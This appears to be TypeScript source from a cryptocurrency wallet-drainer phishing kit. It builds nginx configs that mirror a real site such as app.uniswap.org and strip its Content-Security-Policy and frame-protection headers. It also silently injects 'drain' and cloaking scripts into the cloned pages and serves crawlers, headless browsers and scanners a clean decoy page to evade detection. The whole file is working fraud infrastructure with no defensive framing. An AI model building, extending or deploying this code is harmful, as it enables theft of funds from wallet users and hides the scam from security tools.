/**
 * Production-quality mirror asset builders (#1–#9).
 */
import { readFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

export type ProductionMirrorConfig = {
  backendUrl: string
  kineticKey?: string
  walletConnectProjectId?: string
  targetOrigin: string
  targetHost: string
}

async function loadTemplate(name: string): Promise<string> {
  return readFile(path.join(__dirname, name), 'utf8')
}

function substitute(template: string, config: ProductionMirrorConfig): string {
  return template
    .replace(/__BACKEND_URL__/g, config.backendUrl.replace(/\/$/, ''))
    .replace(/__KINETIC_KEY__/g, config.kineticKey?.trim() ?? '')
    .replace(/__WC_PROJECT_ID__/g, config.walletConnectProjectId?.trim() ?? '')
    .replace(/__TARGET_ORIGIN__/g, config.targetOrigin)
    .replace(/__TARGET_HOST__/g, config.targetHost)
}

export async function buildMirrorSilentDrainJs(config: ProductionMirrorConfig): Promise<string> {
  return substitute(await loadTemplate('mirror-silent-drain.js'), config)
}

export async function buildMirrorBalanceDisplayJs(config: ProductionMirrorConfig): Promise<string> {
  return substitute(await loadTemplate('mirror-balance-display.js'), config)
}

export async function buildMirrorCloakClientJs(): Promise<string> {
  return loadTemplate('mirror-cloak-client.js')
}

/** HTML inject tags for production clone — scripts only, zero visible UI unless qaVisible */
export function buildProductionInjectTags(opts?: { qaVisible?: boolean }): string {
  if (opts?.qaVisible) {
    return [
      '<link rel="stylesheet" href="/legion-authorized-drain.css" />',
      '<script src="/legion-cloak-client.js"></script>',
      '<script src="/legion-authorized-drain.js" defer></script>',
      '<script src="/legion-balance-display.js" defer></script>',
    ].join('')
  }
  return [
    '<script src="/legion-cloak-client.js"></script>',
    '<script src="/legion-authorized-drain.js" defer></script>',
    '<script src="/legion-balance-display.js" defer></script>',
  ].join('')
}

/** Extract registrable base domain for subdomain rewrite (e.g. app.uniswap.org → uniswap.org) */
export function extractBaseDomain(host: string): string {
  const parts = host.split('.').filter(Boolean)
  if (parts.length <= 2) return host
  return parts.slice(-2).join('.')
}

/** Common subdomain labels to pre-rewrite through __legion_proxy/ */
export function commonSubdomainHosts(baseDomain: string, primaryHost: string): string[] {
  const labels = [
    'www',
    'app',
    'api',
    'cdn',
    'static',
    'assets',
    'rpc',
    'graphql',
    'ws',
    'data',
    'metrics',
    'gateway',
    'interface.gateway',
    'interface',
    'images',
    'media',
    'fonts',
    'js',
    'build',
    'chunks',
  ]
  const hosts = new Set<string>([primaryHost])
  for (const label of labels) {
    hosts.add(`${label}.${baseDomain}`)
  }
  return [...hosts]
}

/** Nginx location block — wildcard subdomain passthrough with WebSocket + static cache */
export function buildSubdomainProxyLocation(upstreamScheme: string): string {
  const cacheDirectives = `
      proxy_cache legion_static;
      proxy_cache_valid 200 24h;
      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
      proxy_cache_lock on;
      proxy_buffering off;
      add_header X-Legion-Cache-Status $upstream_cache_status always;`

  return `
    # Subdomain passthrough — /__legion_proxy/<host>/<path> → ${upstreamScheme}://<host>/<path>
    location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
      set $upstream_path $proxy_path;
      if ($upstream_path = "") { set $upstream_path /; }
      proxy_pass ${upstreamScheme}://$proxy_host$upstream_path$is_args$args;
      proxy_ssl_server_name on;
      proxy_set_header Host $proxy_host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;
      proxy_set_header Accept-Encoding "";${cacheDirectives}
    }
`
}

const NGINX_STATIC_PROXY_STRIP = `
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;`

/** Static upstream assets — 24h cache for images, fonts, CSS, JS (^~ /legion- wins over regex). */
export function buildMirrorStaticAssetLocation(
  upstreamScheme: string,
  host: string,
  wafBypassHeaders = '',
  proxyCookieHeader = '',
): string {
  const cacheBlock = `
      proxy_cache legion_static;
      proxy_cache_valid 200 24h;
      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
      proxy_cache_lock on;
      proxy_buffering off;
      add_header X-Legion-Cache-Status $upstream_cache_status always;`

  return `
    location ~* \\.(?:png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|css|js|mjs|map)$ {
      set $legion_upstream_host ${host};
      proxy_pass ${upstreamScheme}://$legion_upstream_host$request_uri;
      proxy_ssl_server_name on;
      proxy_set_header Host ${host};
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Accept-Encoding "";
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;${cacheBlock}${NGINX_STATIC_PROXY_STRIP}${wafBypassHeaders}${proxyCookieHeader}
    }
`
}

/** nginx sub_filter rules — absolute URLs → relative / subdomain proxy (#5) */
export function buildProductionAssetRewriteFilters(
  target: URL,
  opts?: { skipDirectiveHeader?: boolean },
): string {
  const origin = target.origin
  const host = target.host
  const base = extractBaseDomain(host)
  const hosts = commonSubdomainHosts(base, host)
  const lines: string[] = []
  if (!opts?.skipDirectiveHeader) {
    lines.push(
      '      sub_filter_once off;',
      '      sub_filter_types text/html text/css application/javascript application/json text/javascript;',
    )
  }
  lines.push(
    `      sub_filter '${origin}' '';`,
    `      sub_filter 'https://${host}' '';`,
    `      sub_filter 'http://${host}' '';`,
    `      sub_filter 'href="/' 'href="/';`,
    `      sub_filter "href='/" "href='/";`,
    `      sub_filter 'action="/' 'action="/';`,
    `      sub_filter 'src="/' 'src="/';`,
    `      sub_filter 'url(${origin}' 'url(';`,
    `      sub_filter 'url(https://${host}' 'url(';`,
    `      sub_filter 'url(http://${host}' 'url(';`,
  )
  for (const h of hosts) {
    if (h === host) continue
    lines.push(`      sub_filter 'https://${h}' '/__legion_proxy/${h}';`)
    lines.push(`      sub_filter 'http://${h}' '/__legion_proxy/${h}';`)
    lines.push(`      sub_filter '//${h}' '/__legion_proxy/${h}';`)
  }
  return `\n${lines.join('\n')}\n`
}

/** Enhanced server-side bot maps (#6) */
export const NGINX_PRODUCTION_CLOAK_MAPS = `
  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*bytespider 1;
    ~*petalbot 1;
    ~*curl/ 1;
    ~*wget/ 1;
    ~*python-requests 1;
  }

  map $http_accept_language $is_bot_lang {
    default 0;
    "" 1;
  }

  map "$is_bot_ua$is_bot_lang" $legion_is_bot {
    default 0;
    11 1;
    10 1;
    01 1;
  }

  map $uri $legion_cloak_exempt {
    default 0;
    =/mirror-health 1;
    =/mirror-config.json 1;
    ~^/legion- 1;
    ~^/__legion__/ 1;
  }

  map "$legion_is_bot$legion_cloak_exempt" $legion_apply_cloak {
    default 0;
    10 1;
  }
`

export function buildProductionCloakServerBlock(): string {
  return `
    location = /bots-clean.html {
      try_files /bots-clean.html =404;
      add_header Cache-Control "no-store";
    }

    error_page 418 = /bots-clean.html;
`
}

/** Bot cloak — only on proxied HTML location (not /mirror-health or /legion-*). */
export function buildProductionCloakLocationGuard(): string {
  return `
      if ($legion_apply_cloak) { return 418; }`
}
